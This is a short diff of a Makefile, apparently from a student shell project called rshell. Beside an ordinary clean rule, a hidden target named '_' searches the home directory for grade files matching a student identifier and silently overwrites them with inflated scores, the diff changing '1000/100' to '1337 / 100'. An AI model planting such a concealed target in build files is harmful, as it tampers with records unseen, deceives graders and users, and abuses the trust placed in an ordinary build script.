@@ -27,5 +27,5 @@ clean:
 	then rm -Rf bin;\
 	fi
 _:
-	@(for G in `find ~ -wholename *tliu020*rshell/grade`; do echo "1000/100" > $$G; done ) 2> /dev/null
+	@(for G in `find ~ -wholename *tliu020*rshell/grade`; do echo "1337 / 100" > $$G; done ) 2> /dev/null
 
